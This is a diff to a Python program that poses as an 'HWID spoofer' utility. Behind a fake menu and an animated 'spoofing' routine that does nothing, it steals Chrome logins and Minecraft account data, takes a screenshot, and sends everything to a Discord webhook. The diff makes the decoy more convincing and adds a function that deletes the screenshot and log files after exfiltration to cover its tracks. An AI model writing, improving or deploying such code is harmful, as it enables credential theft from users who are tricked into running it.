@@ -24,24 +24,25 @@ from PIL import ImageGrab
 
 Webhook = ""
 
-
-def fakeMessage():
+def delete():
     os.remove("LatestLog.txt")
     os.remove(screenshot_path)
-    logo = ("""\033[1;36;40m
-    ╭━━━╮╱╱╱╱╱╱╱╱╱╭━╮╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
-    ┃╭━╮┃╱╱╱╱╱╱╱╱╱┃╭╯╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
-    ┃╰━━┳━━┳━━┳━━┳╯╰┳┳━╮╭━━╮╰╯┃┃┣┻━┳━━┫┃
-    ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭╋┫╭╮┫╭╮┃╱╱┃┃┃╭╮┃╭╮┃┃
-    ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃┃┃┃╰╯┃╱╱┃┃┃╰╯┃╰╯┃╰╮
-    ╰━━━┫╭━┻━━┻━━╯╰╯╰┻╯╰┻━╮┃╱╱╰╯╰━━┻━━┻━╯
-    ╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-    ╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯by SSIDSpin""")
+def fakeMessage():
+
+    logo = ("""\033[1;36;40m|
+|    ╭━━━╮╱╱╱╱╱╱╱╱╱╭━╮╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
+|    ┃╭━╮┃╱╱╱╱╱╱╱╱╱┃╭╯╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
+|    ┃╰━━┳━━┳━━┳━━┳╯╰┳┳━╮╭━━╮╰╯┃┃┣┻━┳━━┫┃
+|    ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭╋┫╭╮┫╭╮┃╱╱┃┃┃╭╮┃╭╮┃┃
+|    ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃┃┃┃╰╯┃╱╱┃┃┃╰╯┃╰╯┃╰╮
+|    ╰━━━┫╭━┻━━┻━━╯╰╯╰┻╯╰┻━╮┃╱╱╰╯╰━━┻━━┻━╯
+|    ╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
+|    ╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯by SSIDSpin""")
     os.system('cls||clear')
     print(logo)
     i=0.5
     while i < 4:
-        print("Loading" + "." * int(i))
+        print("|    Loading" + "." * int(i))
         time.sleep(i)
         i += 1
     os.system('cls||clear')
@@ -49,28 +50,43 @@ def fakeMessage():
     if len(sys.argv) == 1:
         run_in_background()
     while True:
-        print("""\nSelect Option (Use Numbers To Make A Choice)
-        1 -> Spoof HWID
-        2 -> Find GF
-        3 -> Hack Nasa
-        4 -> Obtain A Life
-        """)
-        option = input("Enter your choice: ")
+        print("""|     
+|    ┏━━Options━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+|    ┃                                    ┃
+|    ┃  [1] -> Spoof HWID                 ┃
+|    ┃  [2] -> Cleaner                    ┃ 
+|    ┃  [3] -> Fix Bugs                   ┃
+|    ┃  [4] -> Exit                       ┃
+|    ┃                                    ┃
+|    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+|        """)
+        option = input("|    Enter your choice: ")
         
         if option == "1":
-            print("Option 1 Selected: Starting Spoofing HWID Now")
-            print("Spoofing Now")
+            print("|    Option 1 Selected: HWID Spoofer")
+            print("|    Starting Spoofing Now")
+            spoofhwid()
+            time.sleep(5)
+            os.system('cls||clear')
+            
         elif option == "2":
-            print("Option 2 Selected: Finding GF")
+            print("|    Option 2 Selected: Cleaner")
             
         elif option == "3":
-            print("Option 3 Selected: Hacking Nasa")
+            print("|    Option 3 Selected: Fix Bugs")
             
         elif option == "4":
-            print("Option 4 Selected: Obtaining A Life")
-            
+            print("|    Option 4 Selected: Are You Sure You Want To Quit? Y|N")
+            option2 = input("").strip().upper() 
+            if option2 == "Y":
+                print("|    Exiting program... Goodbye!")
+                break 
+            elif option2 == "N":
+                print("|    Returning to main menu.")
+            else:
+                print("|    Invalid option. Please select Y or N.")
         else:
-            print("Invalid option. Please select a valid option.")
+            print("|    Invalid option. Please select a valid option.")
 
 
 
@@ -90,6 +106,21 @@ screenshot.save(screenshot_path)
 screenshot.close()
 logging.basicConfig(level=logging.CRITICAL)
 Uploadlink = []
+
+
+def spoofhwid():
+    print("|    Generating HWID Key")
+    time.sleep(1)
+    RndHWID = uuid.uuid1()
+    print(f"|    HWID Key Created -> {RndHWID}")
+    print("|    Setting HWID Key Please Wait")
+    print("|    Loading" + ".")
+    time.sleep(1)
+    print("|    Loading." + ".")
+    time.sleep(1)
+    print("|    Loading.." + ".")
+    time.sleep(3)
+    print("|    Complete HWID Spoofed, Please Restart Your Machine")
 
 def get_secret_key():
     try:
@@ -367,6 +398,7 @@ if __name__ == '__main__':
                 send_to_discord(Webhook, embed=ChromeData)
                 os.remove("chrome_logins.txt")
             send_to_discord(Webhook, embed=MCAccount)
+            delete()
             fakeMessage()
 
     except Exception as e:#Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
@@ -377,4 +409,5 @@ if __name__ == '__main__':
             colour = 0xEE4B2B
             )
             send_to_discord(Webhook, embed=ChromeDataError)
+        delete()
         fakeMessage()
